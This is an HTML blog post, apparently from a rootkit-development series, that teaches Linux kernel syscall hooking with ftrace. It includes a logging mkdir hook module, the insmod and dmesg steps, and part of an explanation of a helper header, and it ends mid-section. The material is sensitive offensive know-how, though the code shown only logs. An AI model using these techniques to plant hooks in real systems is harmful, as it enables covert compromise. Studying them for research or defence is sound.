@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Linux Rootkits Part 2: Ftrace and Function Hooking :: TheXcellerator</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Okay, so you&amp;rsquo;ve built your first kernel module, but now you want to make it do something cool - something like altering the behaviour of the running kernel. The way we do this is by function hooking, but the question is - how do we know which functions to hook?
+Luckily for us, there is already a great list of potential targets: syscalls! Syscalls (or system calls) are kernel functions that can be called from userspace, and are required for almost anything remotely interesting." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/linux_rootkits_02/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="TheXcellerator" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Linux Rootkits Part 2: Ftrace and Function Hooking :: TheXcellerator">
+<meta property="og:description" content="Okay, so you&amp;rsquo;ve built your first kernel module, but now you want to make it do something cool - something like altering the behaviour of the running kernel. The way we do this is by function hooking, but the question is - how do we know which functions to hook?
+Luckily for us, there is already a great list of potential targets: syscalls! Syscalls (or system calls) are kernel functions that can be called from userspace, and are required for almost anything remotely interesting." />
+<meta property="og:url" content="/posts/linux_rootkits_02/" />
+<meta property="og:site_name" content="Linux Rootkits Part 2: Ftrace and Function Hooking" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="linux" />
+
+
+  <meta property="article:published_time" content="2020-08-26 21:00:00 &#43;0100 BST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    TheXcellerator
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/categories/cryptography/">Cryptography</a></li>
+        
+      
+        
+          <li><a href="/categories/linux/">Linux</a></li>
+        
+      
+        
+          <li><a href="/categories/other/">Other</a></li>
+        
+      
+        
+          <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/categories/cryptography/">Cryptography</a></li>
+      
+    
+      
+        <li><a href="/categories/linux/">Linux</a></li>
+      
+    
+      
+        <li><a href="/categories/other/">Other</a></li>
+      
+    
+      
+        <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/linux_rootkits_02/">Linux Rootkits Part 2: Ftrace and Function Hooking</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-08-26
+    </span>
+    
+    
+    <span class="post-author">::
+      TheXcellerator
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="/tags/rootkit/">rootkit</a>&nbsp;
+    
+    #<a href="/tags/ftrace/">ftrace</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>Okay, so you&rsquo;ve built your first kernel module, but now you want to make it do something cool - something like altering the behaviour of the running kernel. The way we do this is by function hooking, but the question is - how do we know which functions to hook?</p>
+<p>Luckily for us, there is already a great list of potential targets: <em>syscalls</em>! Syscalls (or <em>system calls</em>) are kernel functions that can be called from userspace, and are required for almost anything remotely interesting. A few common ones that you&rsquo;ve probably heard of are:</p>
+<ul>
+<li>open</li>
+<li>read</li>
+<li>write</li>
+<li>close</li>
+<li>execve</li>
+<li>fork</li>
+<li>kill</li>
+<li>mkdir</li>
+</ul>
+<p>You can see a complete list of x86_64 syscalls <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">here</a>. Adding our own functionality into any of these functions could be very interesting. We could intercept <code>read</code> calls to certain files and return something different, or add custom environment variables with <code>execve</code>. We could even use some disused signals in <code>kill</code> to send commands to our rootkit to take certain actions.</p>
+<p>But first, it will be helpful to have a better idea about how we make a syscall from userspace - after all, it&rsquo;s this process that we&rsquo;re hoping to intercept!</p>
+<h1 id="syscalls-in-linux-from-userspace">Syscalls in Linux from Userspace<a href="#syscalls-in-linux-from-userspace" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>If you took a look at the <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">syscall table</a> above, then you&rsquo;d have seen that every syscall has an associated number assigned to it (these numbers are actually fairly fluid and will vary between different architectures and kernel versions, but fortunately we&rsquo;re provided with a bunch of macros to get us out of trouble).</p>
+<p>If we want to to make a syscall, then we have to store the syscall number we want into the <code>rax</code> register and then call the kernel with the software interrupt <code>int 0x80</code>. Any arguments that the syscall needs have to be loaded into certain registers before we use the interrupt and the return value is almost always placed into <code>rax</code>.</p>
+<p>This is best illustrated by an example - let&rsquo;s take syscall 0, <code>sys_read</code> (all syscalls are prefaced by <code>sys_</code>). If we look up this syscall with <code>man 2 read</code>, we see that it is defined as:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p><code>fd</code> is the file descriptor (returned from calling <code>open()</code>), <code>buf</code> is a buffer to store the read data into and <code>count</code> is the number of bytes to read. The return value is number of bytes successfully read, and is <code>-1</code> on error.</p>
+<p>We see that we have 3 arguments that need to be passed to the <code>sys_read</code> syscall, but how do we know which registers to put them in? The <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a> gives us the following answer:</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>rax</th>
+<th>rdi</th>
+<th>rsi</th>
+<th>rdx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sys_read</code></td>
+<td><code>0x00</code></td>
+<td><code>unsigned int fd</code></td>
+<td><code>char __user *buf</code></td>
+<td><code>size_t count</code></td>
+</tr>
+</tbody>
+</table>
+<p>So, <code>rdi</code> gets the file descriptor, <code>rsi</code> gets a pointer to the buffer, and <code>rdx</code> gets the number of bytes to be read. As long as we&rsquo;ve already stored <code>0x00</code> in <code>rax</code>, then we can go ahead and call the kernel and our syscall will be made for us! An example bit of NASM might look like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">mov</span> rdi, <span style="color:#ae81ff">5</span>
+<span style="color:#a6e22e">mov</span> rsi, buf
+<span style="color:#a6e22e">mov</span> rdx, <span style="color:#ae81ff">10</span>
+<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</code></pre></div><p>This would read 10 bytes from file descriptor 5 (randomly chosen) and store the contents in the memory location pointed to by <code>buf</code>. Pretty simple, right?</p>
+<h1 id="how-the-kernel-handles-syscalls">How the kernel handles syscalls<a href="#how-the-kernel-handles-syscalls" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>That&rsquo;s all well and good for userspace, but what about the kernel? Our rootkits are going to run in the context of the kernel, so we ought to have some understanding of how the kernel handles syscalls.</p>
+<p>Unfortunately, this is where things start to differ a bit. In 64-bit kernel versions 4.17.0 and above, the manner in which syscalls are handled by the kernel changed. First, we&rsquo;ll look at the old way because it still applies to distros like Ubuntu 16.04 and the newer version is a lot easier to understand once the old way makes sense.</p>
+<blockquote>
+<p>I only recently had to implement the special case for kernel versions below 4.17.0. I was doing a CTF and found that sudo had been configured so that I could run <code>insmod</code> as root without a password. Unfortunately the box was running Ubuntu 16.04 and my rootkits were configured to hook syscalls using the newer calling convention!</p>
+</blockquote>
+<p>If we take a look at the <a href="https://github.com/torvalds/linux/blob/b07175dc41babfec057f494d22a750af755297d8/include/linux/syscalls.h#L468">source code</a> for <code>sys_read</code> in the kernel, we see the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p>Back in 2016, arguments were passed to the syscall exactly how it appears to be. If we were writing a hook for <code>sys_read</code>, we&rsquo;d just have to imitate this function declaration ourselves and (once we&rsquo;d put the hook in place), we&rsquo;d be able to play with these arguments however we like.</p>
+<p>With (64-bit) kernel version 4.17.0, this changed. The arguments that are first stored in registers by the user are copied into a special struct called <code>pt_regs</code>, and then this is the only thing passed to the syscall. The syscall is then responsible for pulling the arguments it needs out of this struct. According to <a href="https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12">ptrace.h</a>, it has the following form:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> pt_regs {
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bx;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> cx;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> dx;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> si;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> di;
+    <span style="color:#75715e">/* redacted for clarity */</span>
+};
+</code></pre></div><p>This means that, in the case of <code>sys_read</code>, we&rsquo;d have to do something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+{
+    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
+    <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
+    size_t count <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>d;
+    <span style="color:#75715e">/* rest of function */</span>
+}
+</code></pre></div><p>Ofcourse, the real <code>sys_read</code> doesn&rsquo;t need to do this as the kernel does the work for us. But <em>we</em> will need to handle arguments this way when we write a hook function.</p>
+<h1 id="our-first-syscall-hook">Our First Syscall Hook<a href="#our-first-syscall-hook" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With all that out of the way, let&rsquo;s get on with writing a function hook! We&rsquo;re going to take into consideration the two methods above to create a very simple hook for <code>sys_mkdir</code> that prints out the name of the directory being created to the kernel buffer. Afterwards we&rsquo;ll worry about actually getting this hook used instead of the real <code>sys_mkdir</code>.</p>
+<p>First, we&rsquo;ll need to check what kernel version we&rsquo;re compiling on - <code>linux/version.h</code> will help us with that. Then we&rsquo;ll use a bunch of preprocessor macros to simplify things for us.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/syscalls.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/version.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/namei.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+MODULE_AUTHOR(<span style="color:#e6db74">&#34;TheXcellerator&#34;</span>);
+MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;mkdir syscall hook&#34;</span>);
+MODULE_VERSION(<span style="color:#e6db74">&#34;0.01&#34;</span>);
+
+<span style="color:#75715e">#if defined(CONFIG_X86_64) &amp;&amp; (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))
+</span><span style="color:#75715e">#define PTREGS_SYSCALL_STUBS 1
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#ifdef PTREGS_SYSCALL_STUBS
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_mkdir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_mkdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+{
+    <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>di;
+    <span style="color:#66d9ef">char</span> dir_name[NAME_MAX] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+    <span style="color:#66d9ef">long</span> error <span style="color:#f92672">=</span> strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir_name);
+
+    orig_mkdir(regs);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_mkdir)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname, umode_t mode);
+
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_mkdir</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname, umode_t mode)
+{
+    <span style="color:#66d9ef">char</span> dir_name[NAME_MAX] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+
+    <span style="color:#66d9ef">long</span> error <span style="color:#f92672">=</span> strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: trying to create directory with name %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dir_name);
+
+    orig_mkdir(pathname, mode);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/* init and exit functions where the hooking will happen later */</span>
+</code></pre></div><p>Okay, a lot take in here. The first thing to notice is that we have 2 almost identical functions, separated by an if/else preprocessor condition. After checking the kernel version and architecture, <code>PTREGS_SYSCALL_STUBS</code> may or may not be defined. If it is, then we define both the <code>orig_mkdir</code> function pointer and the <code>hook_mkdir</code> function declaration to use the <code>pt_regs</code> struct. Otherwise, we give the full declaration using the actual names of the arguments. Notice in the first version of the hook (where we use <code>pt_regs</code>), we also have to include the line</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>pathname <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>di;
+</code></pre></div><p>in order to pull the pathname argument out of the <code>regs</code> struct.</p>
+<p>The other important thing to notice is the use of the <code>strncpy_from_user()</code> function. The presence of the <code>__user</code> identifier for the <code>pathname</code> argument means that it points to a location in <em>userspace</em> which isn&rsquo;t necessarily mapped into our address space. Trying to dereference <code>pathname</code> will result in either a segfault, or garbage data being printed by <code>printk()</code>. Neither of these scenarios are very useful.</p>
+<p>To overcome this, the kernel provides us with a bunch of functions like <code>copy_from_user()</code>, <code>strncpy_from_user()</code>, etc, as well as <code>copy_to_user()</code> versions for copying data back into userspace. In the snippet above, we are copying a string <em>from</em> <code>pathname</code>, <em>to</em> <code>dir_name</code>, and we will read up to <code>NAME_MAX</code> (which is usually 255 - the maximum length of a filename in Linux), or until we hit a null-byte (this is the advantage of using <code>strncpy_from_user()</code> over the plain old <code>copy_from_user()</code> - it is null-byte aware!).</p>
+<p>Once we&rsquo;ve got the name of the new folder to-be stored in the <code>dir_name</code> buffer, we can go ahead and use <code>printk()</code> with the usual <code>%s</code> format string to print it out to the kernel buffer.</p>
+<p>Finally, the most important part is that we actually call <code>orig_mkdir()</code> with the corresponding arguments. This ensures that the original functionality of <code>sys_mkdir</code> (i.e. actually creating a new folder) is still preserved. You may be wondering, how is <code>orig_mkdir</code> anything to do with the real <code>sys_mkdir</code> - all we&rsquo;ve done is define it via a function pointer prototype! Connecting <code>orig_mkdir</code> to the real <code>sys_mkdir</code> is all a part of the function hooking process that we&rsquo;re about to come to. Notice that, in both cases, <code>orig_mkdir</code> is defined globally. This allows the hooking/unhooking code in <code>rootkit_init</code> and <code>rootkit_exit</code> to make use of it.</p>
+<p>The only thing left is to actually get this function hooked into the kernel in place of the real <code>sys_mkdir</code>!</p>
+<h1 id="function-hooking-with-ftrace">Function Hooking with Ftrace<a href="#function-hooking-with-ftrace" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We&rsquo;re going to be using Ftrace to create a function hook within the kernel, but you don&rsquo;t <em>really</em> need to understand exactly what&rsquo;s going on. In practice, we create an <code>ftrace_hook</code> array, and then call <code>fh_install_hooks()</code> in <code>rootkit_init()</code> and <code>fh_uninstall_hooks()</code> in <code>rootkit_exit()</code>. For most practical purposes, that&rsquo;s <em>all you need to know</em>. The real guts of any rootkit is going to be hooks themselves, which will be focus of later blog posts. All the functionality we need has been packed into a header file called <a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h"><code>ftrace_helper.h</code></a> by yours truly.</p>
+<p>For some of you, this won&rsquo;t be satisfying enough, so I&rsquo;ll save a more full explanation of Ftrace for the next section. If you&rsquo;re not fussed, then don&rsquo;t worry about it.</p>
+<p>Moving forwards, we need to include <a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h"><code>ftrace_helper.h</code></a> in our module source, and then write our init and exit functions.</p>
+<p>But first we need to specify an array that Ftrace will use to handle the hooking for us.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> ftrace_hook hook[] <span style="color:#f92672">=</span> {
+    HOOK(<span style="color:#e6db74">&#34;sys_mkdir&#34;</span>, hook_mkdir, <span style="color:#f92672">&amp;</span>orig_mkdir),
+};
+</code></pre></div><p>The <code>HOOK</code> macro requires the name of the syscall or kernel function that we&rsquo;re targetting (<code>sys_mkdir</code>), the hook function we&rsquo;ve written (<code>hook_mkdir</code>) and the address of where we want the original syscall to be saved (<code>orig_mkdir</code>). Note that <code>hook[]</code> can contain more than just a single function hook for more complicated rootkits!</p>
+<p>Once this array is setup, we use <code>fh_install_hooks()</code> to install the function hooks and <code>fh_remove_hooks()</code> to remove them. All we have to do is put them in the init and exit functions respectively and do a little error checking:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">rootkit_init</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">int</span> err;
+    err <span style="color:#f92672">=</span> fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    <span style="color:#66d9ef">if</span>(err)
+        <span style="color:#66d9ef">return</span> err;
+
+    printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">rootkit_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: unloaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+</code></pre></div><p>You can download all 3 needed files <a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1">here</a> - it&rsquo;s time to build! After running <code>make</code>, you should be looking at <code>rootkit.ko</code> sitting in your directory. Load it into the kernel with <code># insmod rootkit.ko</code> and create a new folder with <code>mkdir</code>. If you check the output of <code>dmesg</code>, you should see something like:</p>
+<pre><code>$ sudo dmesg -C
+$ sudo insmod rootkit.ko
+$ mkdir lol
+$ dmesg
+[ 3271.730008] rootkit: loaded
+[ 3276.335671] rootkit: trying to create directory with name: lol
+</code></pre><p>We&rsquo;ve succesfully hooked the <code>sys_mkdir</code> syscall! Ftrace took care of making sure <code>orig_mkdir</code> pointed to the original <code>sys_mkdir</code> so that we can just call it from within our hook without worrying about the underlying details!</p>
+<p>For future rookits, all we need to do is write a new hook for whatever function we&rsquo;re targetting, and update the <code>hooks[]</code> array with the details.</p>
+<blockquote>
+<p>It&rsquo;s worth pointing out that we can only hook functions that are <em>exposed</em> by the kernel. You can see a list of the exposed objects by taking a look at <code>/proc/kallsyms</code> (requires root otherwise all the memory addresses are <code>0x0</code>). Clearly, all the syscalls need to be exposed so that userspace can get to them, but there are also other functions of interest that aren&rsquo;t syscalls (but still exposed)  which we&rsquo;ll come back to later.</p>
+</blockquote>
+<h1 id="bonus-the-details-of-ftrace_helperh">BONUS: The Details of <code>ftrace_helper.h</code><a href="#bonus-the-details-of-ftrace_helperh" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>So, you wanna better understand what <a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h">ftrace</a> is doing in our rootkit, right? Roughly speaking, one of the features of ftrace is that it allows us to attach a callback to part of the kernel. Specifically, we can tell ftrace to step in whenever the <code>rip</code> register contains a certain memory address. If we set this address to that of <code>sys_mkdir</code> (or any other function) then we can cause another function to be executed instead.</p>
+<p>All the information ftrace needs to achieve this has to be packed into a struct called <code>ftrace_hook</code>. Because we want to allow for more than a single hook, we use the <code>hooks[]</code> array:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> ftrace_hook hooks[] <span style="color:#f92672">=</span> {
+    HOOK(<span style="color:#e6db74">&#34;sys_mkdir&#34;</span>, hook_mkdir, <span style="color:#f92672">&amp;</span>orig_mkdir),
+};
+</code></pre></div><p>There&rsquo;s a bit to unpack here. First of all, let&rsquo;s look at the <code>ftrace_hook</code> struct in <a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h"><code>ftrace_helper.h</code></a>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> ftrace_hook {
+    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>function;
+    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>original;
+
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> address;
+    <span style="color:#66d9ef">struct</span> ftrace_ops ops;
+};
+</code></pre></div><p>To make filling this struct a bit quicker and simpler, we&rsquo;ve got the <code>HOOK</code> macro:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define HOOK(_name, _hook, _orig) \
+</span><span style="color:#75715e">{ \
+</span><span style="color:#75715e">    .name = SYSCALL_NAME(_name), \
+</span><span style="color:#75715e">    .function = (_hook), \
+</span><span style="color:#75715e">    .original = (_orig), \
+</span><span style="color:#75715e">}
+</span></code></pre></div><blockquote>
+<p>The <code>SYSCALL_NAME</code> macro takes care of the fact that, on 64-bit kernels, syscalls have <code>__x64_</code> prepended to their names.</p>
+</blockquote>
+<p>That&rsquo;s the easy part. Now, we need to look at the <code>fh_install_hooks()</code> function, which is where the real meat of the work is done. Actually, that&rsquo;s a lie; <code>fh_install_hooks()</code> just loops through the <code>hooks[]</code> array and calls <code>fh_install_hook()</code> on each element. This is where we need to focus our attention.</p>
+<p>The first thing that happens is we call <code>fh_resolve_hook_address()</code> on the <code>ftrace_hook</code> object. This function just uses <code>kallsyms_lookup_name()</code> (provided by <code>&lt;linux/kallsyms.h&gt;</code>) to find the address in memory of the <em>real</em> syscall, i.e. <code>sys_mkdir</code> in our case. This is important because we need to save this both so that we can assign it to <code>orig_mkdir()</code> and that we can restore everything when the module is unloaded. We save this address into the <code>.address</code> field of the <code>ftrace_hook</code> struct.</p>
+<p>Next comes a slightly weird looking preprocessor statement:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#if USE_FENTRY_OFFSET
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>) hook<span style="color:#f92672">-&gt;</span>original) <span style="color:#f92672">=</span> hook<span style="color:#f92672">-&gt;</span>address <span style="color:#f92672">+</span> MCOUNT_INSN_SIZE;
+<span style="color:#75715e">#else
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>) hook<span style="color:#f92672">-&gt;</span>original) <span style="color:#f92672">=</span> hook<span style="color:#f92672">-&gt;</span>address;
+<span style="color:#75715e">#endif
+</span></code></pre></div><p>To understand this, we need to think about the perils of recursive loops when we try to hook functions. There are two main ways to avoid this; we can either attempt to detect recursion by looking at the function return address, or we can just jump over the ftrace call (the <code>+ MCOUNT_INSN_SIZE</code> above). To switch between methods, we have <code>USE_FENTRY_OFFSET</code>. If it is set to 0, we use the first option, otherwise we go with the second.</p>
+<p>We are using the first option, which means that we have to disable the protection that ftrace provides. This built-in protection relies on saving return registers in <code>rip</code>, but if we want to use <code>rip</code>, we can&rsquo;t risk clobbering it. Ultimately we are left having to implement our own protections instead. All this comes down to the <code>.original</code> field in the <code>ftrace_hook</code> struct being set to the memory address of the syscall named in <code>.name</code>.</p>
+<p>Next up in <code>fh_install_hook()</code> is setting the <code>.ops</code> field in the <code>ftrace_hook</code> - which is itself a struct with a couple of fields.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hook<span style="color:#f92672">-&gt;</span>ops.func <span style="color:#f92672">=</span> fh_ftrace_thunk;
+hook<span style="color:#f92672">-&gt;</span>ops.flags <span style="color:#f92672">=</span> FTRACE_OPS_FL_SAVE_REGS
+                <span style="color:#f92672">|</span> FTRACE_OPS_FL_RECURSION_SAFE
+                <span style="color:#f92672">|</span> FTRACE_OPS_FL_IPMODIFY;
